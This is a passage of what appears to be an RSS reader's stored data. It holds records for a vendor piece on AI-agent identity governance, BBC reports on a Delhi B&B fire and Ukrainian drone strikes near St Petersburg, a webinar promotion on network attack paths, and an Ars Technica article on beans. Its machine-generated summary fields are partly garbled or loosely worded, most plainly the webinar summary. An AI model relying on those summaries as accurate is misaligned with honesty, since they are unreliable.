AI-agent adoption is guided by five principles:</p><p>* Human-to-Agent Attribution: Every agent action is linked to a responsible human owner.<br>  * Activity Audit: A complete chain of custody is recorded (Agent → Tool/API → Action → Target).<br>  * Context-Aware Guardrails: Access decisions are evaluated dynamically based on the sensitivity of the resource and the human owner's entitlements.<br>  * Least Privilege: Just-in-Time access replaces persistent privileged credentials.<br>  * Automated Remediation: Risky behavior can trigger automated responses such as credential rotation or session termination.</p><p>By combining application estate discovery, identity telemetry, and AI-driven intelligence, Orchid fulfills the core IVIP mission: turning invisible identity activity into a governed, observable, and controllable security surface.</p>`,summary:`The Fragmented State of Modern Enterprise Identity Enterprise IAM is approaching a breaking point as organizations scale and identity becomes increasingly fragmented across thousands of applications, decentralized teams, machine identities, and autonomous systems. The result is Identity Dark Matter: identity activity that sits outside centralized IAM visibility, amplifying the gap between what security organizations think they have and access actually exists.
+
+• Fragmented State of Modern Enterprise Identity: As organizations scale, identity becomes increasingly fragmented across thousands of applications, decentralized teams, machine identities, and autonomous systems.
+• Hidden Layer: The result is a widening gap between what the security organizations think they have and the actual access that actually exists. That gap is where modern identity risk now lives.`,summary_model:`qwen2.5:0.5b`,image_url:`https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiuT21gubKVL2cAsQrEiju_yAE3Pxe1IPxsl9RlGfhMEeis2IuQglnZjwTme6xM1_IJNymXFY1kZsouMGecR2lQnzvMDXyjnY1Y7CT1Dz_xf0pRVkwJEJG9o1EfOlPMfgfZ0MO6eyKGKJDwRHrEsw2-Cai9QO3pfrryeSENy5kH4C_pdjDgsXVOO80TPy8/s1600/orchid.jpg`,published_at:1780487880,fetched_at:1780509343,content_hash:`992b4135dec2dfec0b0202557410590538e7dad9715a6580b5a1958ab8a70411`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:54,feed_id:9,guid:`https://www.bbc.com/news/articles/czd29327qzvo#0`,url:`https://www.bbc.com/news/articles/czd29327qzvo?at_medium=RSS&at_campaign=rss`,title:`Foreign nationals among at least 21 killed in Delhi fire`,content_html:`<div id="readability-page-1" class="page"><div id="bbc-main"><article><div data-component="headline-block"><p><h2>Foreign nationals among at least 21 killed in Delhi fire</h2></p></div><div data-testid="byline" data-component="byline-block"><p><time datetime="2026-06-03T11:54:25.927Z">6 hours ago</time></p><p><span data-testid="byline-contributors"><p><span>Nikita Yadav,</span><span data-testid="byline-contributors-contributor-0-role-location">Delhi </span><span>and</span></p><p><span>Dilnawaz Pasha,</span><span data-testid="byline-contributors-contributor-1-role-location">BBC Hindi, Delhi</span></p></span></p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/e018/live/5bacc330-5f2a-11f1-9da4-8b99067aa239.png.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/e018/live/5bacc330-5f2a-11f1-9da4-8b99067aa239.png.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/e018/live/5bacc330-5f2a-11f1-9da4-8b99067aa239.png.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/e018/live/5bacc330-5f2a-11f1-9da4-8b99067aa239.png.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/e018/live/5bacc330-5f2a-11f1-9da4-8b99067aa239.png.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/e018/live/5bacc330-5f2a-11f1-9da4-8b99067aa239.png.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/e018/live/5bacc330-5f2a-11f1-9da4-8b99067aa239.png.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/e018/live/5bacc330-5f2a-11f1-9da4-8b99067aa239.png.webp" loading="eager" alt="Reuters Firefighters and police officers stand at the site after a fire at a hotel in New Delhi"/><span>Reuters</span></p></div><p><figcaption>Firefighters and police officers stand at the site after the fire in Delhi</figcaption></p></figure></div><div data-component="text-block"><p>At least 21 people have been killed and dozens injured after a fire tore through a multi-storey building in south Delhi, police in India&#39;s capital say.</p></div><div data-component="text-block"><p>Many of the victims were foreigners - including people from South Asian and African countries - who had travelled to India for medical treatment or to accompany relatives undergoing care, local media reported. </p></div><div data-component="text-block"><p>The building in the Malviya Nagar area allegedly operated as a bed-and-breakfast catering to patients and relatives of those receiving treatment at a nearby private hospital.</p></div><div data-component="text-block"><p>More than 40 people were rescued and taken to hospital. It remains unclear how many were inside the building when fire broke out. Its cause is not yet known.</p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/5ac3/live/f06686c0-5f41-11f1-b682-cf91850925ea.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/5ac3/live/f06686c0-5f41-11f1-b682-cf91850925ea.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/5ac3/live/f06686c0-5f41-11f1-b682-cf91850925ea.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/5ac3/live/f06686c0-5f41-11f1-b682-cf91850925ea.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/5ac3/live/f06686c0-5f41-11f1-b682-cf91850925ea.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/5ac3/live/f06686c0-5f41-11f1-b682-cf91850925ea.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/5ac3/live/f06686c0-5f41-11f1-b682-cf91850925ea.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/5ac3/live/f06686c0-5f41-11f1-b682-cf91850925ea.jpg.webp" loading="lazy" alt="EPA Firefighters stand at the site of a hotel fire in New Delhi , India"/><span>EPA</span></p></div></figure></div><div data-component="text-block"><p>The blaze at the Flourish Stay B&amp;B is one of the deadliest in recent years in the Indian capital. </p></div><div data-component="text-block"><p>&#34;The fire was brought under control quite early on - it was contained very quickly. We have now cleared the building and opened it up for the police,&#34; fire officer AK Malik said.</p></div><div data-component="text-block"><p>Delhi minister Ashish Sood said authorities were investigating whether the building had the necessary permissions to operate as a bed-and-breakfast facility, adding that those found responsible for any violations would face criminal action.</p></div><div data-component="text-block"><p>Prime Minister Narendra Modi expressed his condolences and announced compensation of 200,000 rupees ($2,088; £1,552) for the families of those killed and 50,000 rupees for those injured.</p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/848e/live/d1881e60-5f2a-11f1-9da4-8b99067aa239.png.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/848e/live/d1881e60-5f2a-11f1-9da4-8b99067aa239.png.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/848e/live/d1881e60-5f2a-11f1-9da4-8b99067aa239.png.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/848e/live/d1881e60-5f2a-11f1-9da4-8b99067aa239.png.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/848e/live/d1881e60-5f2a-11f1-9da4-8b99067aa239.png.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/848e/live/d1881e60-5f2a-11f1-9da4-8b99067aa239.png.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/848e/live/d1881e60-5f2a-11f1-9da4-8b99067aa239.png.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/848e/live/d1881e60-5f2a-11f1-9da4-8b99067aa239.png.webp" loading="lazy" alt="ANI A burnt building"/><span>ANI</span></p></div><p><figcaption>The building allegedly operated as a bed-and-breakfast catering to patients and relatives of those receiving treatment at a nearby private hospital</figcaption></p></figure></div><div data-component="text-block"><p>Videos on social media showed flames shooting from the building as people gathered nearby. Footage broadcast by Indian news channels showed its exterior badly charred as emergency workers searched the site.</p></div><div data-component="text-block"><p>Eyewitnesses and locals at the scene told BBC Hindi that, upon entering the building, they found many people unconscious - some lying beneath beds in hotel rooms and others collapsed in washrooms.</p></div><div data-component="text-block"><p>Wasim, who lives nearby and was among the first responders at the scene, recounted a particularly shocking incident. He said he found bodies of a couple in a washroom, holding each other in an embrace. </p></div><div data-component="text-block"><p>Another witness said they performed CPR on several unconscious victims and managed to revive some of them.</p></div><div data-component="text-block"><p>A shopkeeper who runs a quilt store opposite the building said he spread quilts on the ground below to cushion people attempting to jump to safety. </p></div><div data-component="text-block"><p>Several people jumped from the upper floors and some survived, he said. </p></div><div data-component="text-block"><p>Authorities have not yet released a full list of those killed or formally identified the victims. Local media reports, citing officials and other sources, said some of the victims were foreign nationals, including people from neighbouring South Asian countries as well as countries in Africa and Central Asia.</p></div><div data-component="text-block"><p>Several people in the building were from Bangladesh and other parts of South Asia and had travelled to Delhi for medical treatment, local lawmaker Satish Upadhyay said.</p></div><div data-component="text-block"><p>By early evening, the search and rescue operation was nearly complete but ambulances were still on standby as officials continued clearing debris from the site.</p></div><div data-component="text-block"><p>Fires are common in India, where building safety laws are often poorly enforced. </p></div><div data-component="text-block"><p>From factories and coaching centres to hospitals and entertainment venues, many of Delhi&#39;s deadliest blazes have exposed a persistent gap between safety rules on paper and their implementation on the ground. </p></div><div data-component="text-block"><p>Investigations have repeatedly pointed to lax inspections, faulty electrical systems and buildings operating beyond their approved use.</p></div></article></div></div>`,content_text:`Foreign nationals among at least 21 killed in Delhi fire6 hours agoNikita Yadav,Delhi andDilnawaz Pasha,BBC Hindi, DelhiReutersFirefighters and police officers stand at the site after the fire in DelhiAt least 21 people have been killed and dozens injured after a fire tore through a multi-storey building in south Delhi, police in India's capital say.Many of the victims were foreigners - including people from South Asian and African countries - who had travelled to India for medical treatment or to accompany relatives undergoing care, local media reported. The building in the Malviya Nagar area allegedly operated as a bed-and-breakfast catering to patients and relatives of those receiving treatment at a nearby private hospital.More than 40 people were rescued and taken to hospital. It remains unclear how many were inside the building when fire broke out. Its cause is not yet known.EPAThe blaze at the Flourish Stay B&B is one of the deadliest in recent years in the Indian capital. "The fire was brought under control quite early on - it was contained very quickly. We have now cleared the building and opened it up for the police," fire officer AK Malik said.Delhi minister Ashish Sood said authorities were investigating whether the building had the necessary permissions to operate as a bed-and-breakfast facility, adding that those found responsible for any violations would face criminal action.Prime Minister Narendra Modi expressed his condolences and announced compensation of 200,000 rupees ($2,088; £1,552) for the families of those killed and 50,000 rupees for those injured.ANIThe building allegedly operated as a bed-and-breakfast catering to patients and relatives of those receiving treatment at a nearby private hospitalVideos on social media showed flames shooting from the building as people gathered nearby. Footage broadcast by Indian news channels showed its exterior badly charred as emergency workers searched the site.Eyewitnesses and locals at the scene told BBC Hindi that, upon entering the building, they found many people unconscious - some lying beneath beds in hotel rooms and others collapsed in washrooms.Wasim, who lives nearby and was among the first responders at the scene, recounted a particularly shocking incident. He said he found bodies of a couple in a washroom, holding each other in an embrace. Another witness said they performed CPR on several unconscious victims and managed to revive some of them.A shopkeeper who runs a quilt store opposite the building said he spread quilts on the ground below to cushion people attempting to jump to safety. Several people jumped from the upper floors and some survived, he said. Authorities have not yet released a full list of those killed or formally identified the victims. Local media reports, citing officials and other sources, said some of the victims were foreign nationals, including people from neighbouring South Asian countries as well as countries in Africa and Central Asia.Several people in the building were from Bangladesh and other parts of South Asia and had travelled to Delhi for medical treatment, local lawmaker Satish Upadhyay said.By early evening, the search and rescue operation was nearly complete but ambulances were still on standby as officials continued clearing debris from the site.Fires are common in India, where building safety laws are often poorly enforced. From factories and coaching centres to hospitals and entertainment venues, many of Delhi's deadliest blazes have exposed a persistent gap between safety rules on paper and their implementation on the ground. Investigations have repeatedly pointed to lax inspections, faulty electrical systems and buildings operating beyond their approved use.`,cleaned_html:`<p>- The fire broke out at Flourish Stay B&amp;B in south Delhi, India.<br>- At least 21 people were killed and dozens injured after the blaze tore through a multi-storey building.<br>- Many of the victims were foreigners - including people from South Asian and African countries - who had travelled to India for medical treatment or accompanying relatives undergoing care.<br>- The building allegedly operated as a bed-and-breakfast catering to patients and relatives of those receiving treatment at a nearby private hospital.<br>- More than 40 people were rescued and taken to hospital.</p>`,summary:`Foreign nationals among at least 21 killed in Delhi fire
+
+• The fire broke out at Flourish Stay B&B in south Delhi, India.
+• At least 21 people were killed and dozens injured after the blaze tore through a multi-storey building.
+• Many of the victims were foreigners - including people from South Asian and African countries - who had travelled to India for medical treatment or accompanying relatives undergoing care.
+• The building allegedly operated as a bed-and-breakfast catering to patients and relatives of those receiving treatment at a nearby private hospital.
+• More than 40 people were rescued and taken to hospital.`,summary_model:`qwen2.5:0.5b`,image_url:`https://ichef.bbci.co.uk/news/1024/branded_news/c5a0/live/aa946180-5f41-11f1-b682-cf91850925ea.jpg`,published_at:1780487665,fetched_at:1780509343,content_hash:`c904943bac0175113452f592729e0aeb55bb38fd6cbc1510579a0377b3231462`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:52,feed_id:9,guid:`https://www.bbc.com/news/articles/c0e2vqd3j1vo#0`,url:`https://www.bbc.com/news/articles/c0e2vqd3j1vo?at_medium=RSS&at_campaign=rss`,title:`Ukrainian drones hit St Petersburg as Putin's flagship economic forum opens`,content_html:`<div id="readability-page-1" class="page"><div id="bbc-main"><article><div data-component="video-block"><figure><div orientation="landscape"><figcaption>Ukrainian drones hit Russia&#39;s St Petersburg area</figcaption></div></figure></div><div data-component="text-block"><p>Ukraine has carried out a strike on the outskirts of Russia&#39;s St Petersburg, hours before the opening of a major economic forum designed to attract foreign investment into the country.</p></div><div data-component="text-block"><p>As dawn broke black plumes of smoke rose over Russia&#39;s second city, where Vladimir Putin is due to address the financial event on Friday. Thousands of guests from 130 countries are due to attend, including a low-key US delegation.</p></div><div data-component="text-block"><p>Local authorities said air defences shot down 59 drones overnight and that three different districts of St Petersburg had been hit, although no one was killed.</p></div><div data-component="text-block"><p>Kremlin spokesman Dmitry Peskov said Moscow would respond to the strikes. &#34;Our responses will be systemic in nature,&#34; he said on Wednesday.</p></div><div data-component="text-block"><p>Mobile internet was disrupted and St Petersburg&#39;s Pulkovo Airport was temporarily closed, while some regions of nearby Latvia and Estonia also issued air raid alerts. </p></div><div data-component="text-block"><p>Hours later, Volodymyr Zelensky confirmed Ukrainian drones had hit several locations in Russia, including the oil terminal and a naval base in the nearby town of Kronstadt.</p></div><div data-component="text-block"><p>&#34;The Ukrainian plan of long-range sanctions is being implemented exactly as it is needed to bring peace closer,&#34; Zelensky wrote on social media, using a euphemism for long-distance strikes on Russia.</p></div><div data-component="video-block"><figure><div orientation="landscape"><figcaption>Drone strike hits Russian oil depot in St Petersburg area</figcaption></div></figure></div><div data-component="text-block"><p>Kronstadt is the main outpost of the Russian Navy&#39;s Baltic Fleet. Unverified videos posted on social media by Ukrainian military figures showed drones heading for docked military ships, with the video cutting off before impact. </p></div><div data-component="text-block"><p>Robert Brovdi, the commander of Ukraine&#39;s unmanned systems, said on Telegram that the corvette Boikiy was struck. </p></div><div data-component="text-block"><p>The St Petersburg Economic Forum - once dubbed the &#34;Russian Davos&#34; - is a flagship event on the Russian political agenda. </p></div><div data-component="text-block"><p>Until Moscow launched its full-scale invasion of Ukraine in 2022, it used to be attended by high-profile Western delegations, including CEOs and heads of state. </p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/0502/live/047b4620-5f31-11f1-9b94-1bf27e494d9e.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/0502/live/047b4620-5f31-11f1-9b94-1bf27e494d9e.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/0502/live/047b4620-5f31-11f1-9b94-1bf27e494d9e.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/0502/live/047b4620-5f31-11f1-9b94-1bf27e494d9e.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/0502/live/047b4620-5f31-11f1-9b94-1bf27e494d9e.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/0502/live/047b4620-5f31-11f1-9b94-1bf27e494d9e.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/0502/live/047b4620-5f31-11f1-9b94-1bf27e494d9e.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/0502/live/047b4620-5f31-11f1-9b94-1bf27e494d9e.jpg.webp" loading="eager" alt="Reuters Smoke billowing over central St Petersburg"/><span>Reuters</span></p></div><p><figcaption>Black smoke from a burning oil terminal could be seen billowing over central St Petersburg</figcaption></p></figure></div><div data-component="text-block"><p>This year, for the first time in nearly a decade, a low-key US delegation is also due to participate in the forum. It is led by the head of the US Commission of Fine Arts Rodney Mims Cook Jr, the official who has been overseeing President Donald Trump&#39;s ballroom project at the White House. </p></div><div data-component="text-block"><p>US right-wing commentator Candace Owens and Putin-backing US actor Steven Seagal are also due to attend.</p></div><div data-component="text-block"><p>In a tongue-in-cheek post on X, Denys Shtilierman of Ukrainian defence company Fire Point said: &#34;Due to such distinguished guests and the importance of the event itself, we couldn&#39;t ignore it - and urgently flew to [St Petersburg].&#34; </p></div><div data-component="text-block"><p>The post was accompanied by videos of drones crossing the sky and thick black smoke billowing from undisclosed locations on the sea front.</p></div><div data-component="text-block"><p>In the four years since Russia&#39;s invasion began, Ukraine has developed a booming defence sector. Kyiv is now able to regularly hit targets within Russia, focusing its efforts on energy infrastructure and oil facilities, which it sees as fuelling the Russian war machine. </p></div><div data-component="text-block"><p>Moscow, meanwhile, continues to strike Ukrainian cities, resulting in regular civilian casualties. On Monday night alone, at least 22 people were killed in combined missile and drone strikes across Ukraine. </p></div></article></div></div>`,content_text:`Ukrainian drones hit Russia's St Petersburg areaUkraine has carried out a strike on the outskirts of Russia's St Petersburg, hours before the opening of a major economic forum designed to attract foreign investment into the country.As dawn broke black plumes of smoke rose over Russia's second city, where Vladimir Putin is due to address the financial event on Friday. Thousands of guests from 130 countries are due to attend, including a low-key US delegation.Local authorities said air defences shot down 59 drones overnight and that three different districts of St Petersburg had been hit, although no one was killed.Kremlin spokesman Dmitry Peskov said Moscow would respond to the strikes. "Our responses will be systemic in nature," he said on Wednesday.Mobile internet was disrupted and St Petersburg's Pulkovo Airport was temporarily closed, while some regions of nearby Latvia and Estonia also issued air raid alerts. Hours later, Volodymyr Zelensky confirmed Ukrainian drones had hit several locations in Russia, including the oil terminal and a naval base in the nearby town of Kronstadt."The Ukrainian plan of long-range sanctions is being implemented exactly as it is needed to bring peace closer," Zelensky wrote on social media, using a euphemism for long-distance strikes on Russia.Drone strike hits Russian oil depot in St Petersburg areaKronstadt is the main outpost of the Russian Navy's Baltic Fleet. Unverified videos posted on social media by Ukrainian military figures showed drones heading for docked military ships, with the video cutting off before impact. Robert Brovdi, the commander of Ukraine's unmanned systems, said on Telegram that the corvette Boikiy was struck. The St Petersburg Economic Forum - once dubbed the "Russian Davos" - is a flagship event on the Russian political agenda. Until Moscow launched its full-scale invasion of Ukraine in 2022, it used to be attended by high-profile Western delegations, including CEOs and heads of state. ReutersBlack smoke from a burning oil terminal could be seen billowing over central St PetersburgThis year, for the first time in nearly a decade, a low-key US delegation is also due to participate in the forum. It is led by the head of the US Commission of Fine Arts Rodney Mims Cook Jr, the official who has been overseeing President Donald Trump's ballroom project at the White House. US right-wing commentator Candace Owens and Putin-backing US actor Steven Seagal are also due to attend.In a tongue-in-cheek post on X, Denys Shtilierman of Ukrainian defence company Fire Point said: "Due to such distinguished guests and the importance of the event itself, we couldn't ignore it - and urgently flew to [St Petersburg]." The post was accompanied by videos of drones crossing the sky and thick black smoke billowing from undisclosed locations on the sea front.In the four years since Russia's invasion began, Ukraine has developed a booming defence sector. Kyiv is now able to regularly hit targets within Russia, focusing its efforts on energy infrastructure and oil facilities, which it sees as fuelling the Russian war machine. Moscow, meanwhile, continues to strike Ukrainian cities, resulting in regular civilian casualties. On Monday night alone, at least 22 people were killed in combined missile and drone strikes across Ukraine.`,summary:`The Ukrainian government has launched a drone attack on St Petersburg, Russia's second-largest city, hours before the opening of an economic forum aimed at attracting foreign investment. Local authorities say air defences shot down 59 drones overnight, while three districts of St Petersburg were hit. Kremlin spokesman Dmitry Peskov says Moscow will respond to the strikes.
+
+• Ukrainian government launched a drone attack on St Petersburg
+• The attack happened hours before an economic forum is due to open in Russia
+• Local authorities say air defences shot down 59 drones overnight, while three districts of St Petersburg were hit.`,summary_model:`qwen2.5:0.5b`,image_url:`https://ichef.bbci.co.uk/news/1024/branded_news/1588/live/aa879d00-5f51-11f1-b682-cf91850925ea.jpg`,published_at:1780486447,fetched_at:1780509343,content_hash:`e5ca2f73e0057f4240d121658c50b0d28a893a02d4d6357598fa04cb3af194c1`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:68,feed_id:16,guid:`https://thehackernews.com/2026/06/beyond-zero-day-see-your-network-like.html`,url:`https://thehackernews.com/2026/06/beyond-zero-day-see-your-network-like.html`,title:`Beyond the Zero-Day: See Your Network Like an Attacker | Webinar with HD Moore`,author:`The Hacker News`,content_html:`<div id="readability-page-1" class="page"><div id="articlebody"><p><a href="https://thehacker.news/beyond-zero-day"><img alt="" data-original-height="400" data-original-width="770" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzZPASJ7ymlBpeDWq_d-byWp58FpBR6tdX6QfLJFFoGRHK9xB5mTbx0guIcMFKFYV87inRtJyM-cKJXI0Td5fVtpC1ITBFmp2myS2wBynVSF3rZP2jZWH6uR-_14ZEalErJASiKWVDJ_TD551AC0pN5A3Mu8y-Z1zW5mKvFMOmdLzrdWnhYCif0FR1lOE/s1600/hd.jpg"/></a></p>
+<p>Assume the breach. Zero-days keep shipping, AI is writing exploits faster than anyone patches, and &#34;patch everything in time&#34; stopped working years ago. Stop betting the org on winning that race. You don&#39;t control which bug lands. You control what it can reach once it does.</p>
+
+<p>That is a question about the shape of your network, and most teams have the shape wrong. HD Moore, creator of Metasploit and now CEO of runZero, spends the session showing you that shape from the attacker&#39;s side.</p>
+
+<p><b><a href="https://thehacker.news/beyond-zero-day">Save your seat for a LIVE session</a></b>, or register, and we will send you the recording.</p>
+
+<h3>The segmentation you think you have</h3>
+
+<p>The comfortable assumption: critical systems sit behind a firewall or off on their own segment, so a foothold over here cannot become a disaster over there. Call it the segmentation illusion. It holds until someone maps the network for real.</p>
+
+<p>Then the seams show up. A device wired into two networks at once, quietly bridging the zones you meant to keep apart. Connected gear nobody registered, answering on a segment it should not be on. Whole sets of machines hiding behind an industrial protocol gateway, invisible to your scanner, reachable by anyone who knows the gateway is there. None of it is on the asset list. All of it routes around the control you were counting on.</p>
+
+<h3>Inventory is a list. Attackers read a map.</h3>
+
+<p>You keep an inventory, a static list of things you own. An attacker does not care about your list. They care about paths: how one foothold reaches the next, until it lands on something that hurts. The two views rarely match, and the difference is exactly the part of your network you cannot see and they can. Moore built Metasploit, the framework half the industry learned offense on, and now runs the company whose whole job is finding the assets and connections organizations don&#39;t know they have.</p>
+
+<p><b><a href="https://thehacker.news/beyond-zero-day">Grab your spot</a></b> and see that view turned on your own environment.</p>
+
+<h3>What you leave able to do</h3>
+
+<ul>
+  <li><b>Find the assets you don&#39;t know you have.</b> Unsanctioned IT, shadow IoT, and the sub-assets behind OT protocol gateways where your scans never look.</li>
+  <li><b>Find the bridges that break segmentation.</b> The multi-homed devices and forgotten assets connecting zones you believed were isolated.</li>
+  <li><b>See the paths, not just the parts.</b> Trade static inventory for live attack-path mapping that shows how a foothold actually travels.</li>
+  <li><b>Fix the few things that matter.</b> Focus remediation on the assets and links that shorten an attacker&#39;s route to impact.</li>
+</ul>
+<p>Corporate network, factory floor, or both tangled together: if IT, IoT, and OT share your environment, the seams between them are where this goes wrong. See your network the way an attacker already does, before they do.</p>
+
+<h2><a href="https://thehacker.news/beyond-zero-day">Register now</a>. <span>Can&#39;t make it live? Sign up anyway, and we will send the recording.</span></h2>
+
+
+
+<p>Found this article interesting? <span>This article is a contributed piece from one of our valued partners.</span> Follow us on <a href="https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ" rel="noopener" target="_blank">Google News</a>, <a href="https://twitter.com/thehackersnews" rel="noopener" target="_blank">Twitter</a> and <a href="https://www.linkedin.com/company/thehackernews/" rel="noopener" target="_blank">LinkedIn</a> to read more exclusive content we post.</p>
+</div></div>`,content_text:`Assume the breach. Zero-days keep shipping, AI is writing exploits faster than anyone patches, and "patch everything in time" stopped working years ago. Stop betting the org on winning that race. You don't control which bug lands. You control what it can reach once it does.
+
+That is a question about the shape of your network, and most teams have the shape wrong. HD Moore, creator of Metasploit and now CEO of runZero, spends the session showing you that shape from the attacker's side.
+
+Save your seat for a LIVE session, or register, and we will send you the recording.
+
+The segmentation you think you have
+
+The comfortable assumption: critical systems sit behind a firewall or off on their own segment, so a foothold over here cannot become a disaster over there. Call it the segmentation illusion. It holds until someone maps the network for real.
+
+Then the seams show up. A device wired into two networks at once, quietly bridging the zones you meant to keep apart. Connected gear nobody registered, answering on a segment it should not be on. Whole sets of machines hiding behind an industrial protocol gateway, invisible to your scanner, reachable by anyone who knows the gateway is there. None of it is on the asset list. All of it routes around the control you were counting on.
+
+Inventory is a list. Attackers read a map.
+
+You keep an inventory, a static list of things you own. An attacker does not care about your list. They care about paths: how one foothold reaches the next, until it lands on something that hurts. The two views rarely match, and the difference is exactly the part of your network you cannot see and they can. Moore built Metasploit, the framework half the industry learned offense on, and now runs the company whose whole job is finding the assets and connections organizations don't know they have.
+
+Grab your spot and see that view turned on your own environment.
+
+What you leave able to do
+
+
+  Find the assets you don't know you have. Unsanctioned IT, shadow IoT, and the sub-assets behind OT protocol gateways where your scans never look.
+  Find the bridges that break segmentation. The multi-homed devices and forgotten assets connecting zones you believed were isolated.
+  See the paths, not just the parts. Trade static inventory for live attack-path mapping that shows how a foothold actually travels.
+  Fix the few things that matter. Focus remediation on the assets and links that shorten an attacker's route to impact.
+
+Corporate network, factory floor, or both tangled together: if IT, IoT, and OT share your environment, the seams between them are where this goes wrong. See your network the way an attacker already does, before they do.
+
+Register now. Can't make it live? Sign up anyway, and we will send the recording.
+
+
+
+Found this article interesting? This article is a contributed piece from one of our valued partners. Follow us on Google News, Twitter and LinkedIn to read more exclusive content we post.`,summary:`• Zero-Day Exploits: The Future of Network Security
+• Attacker's View of the World: Segmentation vs. Pathfinding
+• Addressing the Segmentation Illusion: A Live Session with HD Moore
+• CLEANED VERSION:
+• Summary`,summary_model:`qwen2.5:0.5b`,image_url:`https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzZPASJ7ymlBpeDWq_d-byWp58FpBR6tdX6QfLJFFoGRHK9xB5mTbx0guIcMFKFYV87inRtJyM-cKJXI0Td5fVtpC1ITBFmp2myS2wBynVSF3rZP2jZWH6uR-_14ZEalErJASiKWVDJ_TD551AC0pN5A3Mu8y-Z1zW5mKvFMOmdLzrdWnhYCif0FR1lOE/s1600/hd.jpg`,published_at:1780486139,fetched_at:1780509343,content_hash:`8d060e00e3c847570dc9ec7f9a66f56121f58dc12f23b51c455bd871461e1489`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:8,feed_id:2,guid:`https://arstechnica.com/science/2026/06/beans-use-an-immune-receptor-to-call-in-airstrikes-on-caterpillars/`,url:`https://arstechnica.com/science/2026/06/beans-use-an-immune-receptor-to-call-in-airstrikes-on-caterpillars/`,title:`Beans use an immune receptor to call in airstrikes on caterpillars`,author:`Jacek Krywko`,content_html:`<p>For decades, scientists have understood that plants can release volatile organic compounds—essentially airborne chemical signals—to attract the natural enemies of the things that eat them, like caterpillars. What we didn’t know was exactly how a plant translates the physical act of being eaten into a specific, predator-summoning distress signal.</p>
+<p>“[One] thing we didn’t know is how the plant detects the caterpillar in the first place,” says Adam Steinbrenner, a biologist at the University of Washington. Now, after years of experimenting with common bean plants in the lab and in the agricultural fields of Oaxaca, Mexico, Steinbrenner’s team pinpointed a single immune receptor that orchestrates its anti-caterpillar defense system.</p>
+<h2>Drooling caterpillars</h2>
+<p>When an herbivorous insect like a caterpillar feeds on a plant, it introduces its saliva straight into the plant's damaged tissues. This saliva contains biological clues called HAMPs: herbivore-associated molecular patterns. One of the HAMPs molecules is a peptide called inceptin, and there’s an 11-amino acid fragment of inceptin named In11, as well. Both of them turn out to be a fragment of the ATP synthase found in chloroplasts—basically a piece of one of the plant’s own proteins. As the caterpillar ingests the leaf, its gut enzymes chop up the plant's cellular engines and their pieces, including In11, are regurgitated back onto the leaf’s surface, albeit at extremely small concentrations.</p><p><a href="https://arstechnica.com/science/2026/06/beans-use-an-immune-receptor-to-call-in-airstrikes-on-caterpillars/">Read full article</a></p>
+
